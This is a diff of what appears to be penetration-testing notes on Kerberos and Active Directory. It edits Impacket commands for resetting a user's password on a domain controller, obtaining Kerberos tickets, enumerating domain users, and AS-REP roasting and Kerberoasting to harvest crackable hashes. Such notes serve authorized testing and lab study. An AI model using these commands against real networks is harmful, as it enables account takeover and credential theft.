@@ -280,6 +280,8 @@ use
 [*] Kerberos
 sudo apt install -y heimdal-clients libsasl2-modules-gssapi-heimdal
 
+impacket-changepasswd $DOM/'$USERNAME':'$PASSWORD'@$TARGET -dc-ip $TARGET -newpass 'Password12345!'
+
 KRB5_FILE="custom_krb5.conf";export KRB5_CONFIG="$PWD/$KRB5_FILE"; nano ./"$KRB5_FILE"
 [libdefaults]
     default_realm = $KRB5DOM
@@ -299,8 +301,8 @@ KRB5_FILE="custom_krb5.conf";export KRB5_CONFIG="$PWD/$KRB5_FILE"; nano ./"$KRB5
 
 impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET; export KRB5CCNAME="$USERNAME.ccache"; chmod 0600 $KRB5CCNAME; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist
 
-impacket-changepasswd $DOM/'$USERNAME':'$PASSWORD'@$TARGET -dc-ip $TARGET -newpass 'Password12345!'
-impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $DC
+SPN=DC; impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $SPN; export KRB5CCNAME='$USERNAME@'"$SPN"'@KRB5DOM.ccache'; chmod 0600 $KRB5CCNAME; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist
+
 impacket-GetADUsers $DOM/ -dc-host $DC -k -no-pass
 impacket-GetNPUsers $DOM/ -dc-ip "$TARGET" -usersfile usernames
 impacket-GetUserSPNs $DOM/'$USERNAME':'$PASSWORD' -dc-ip "$TARGET" -request-user '$USERNAME'
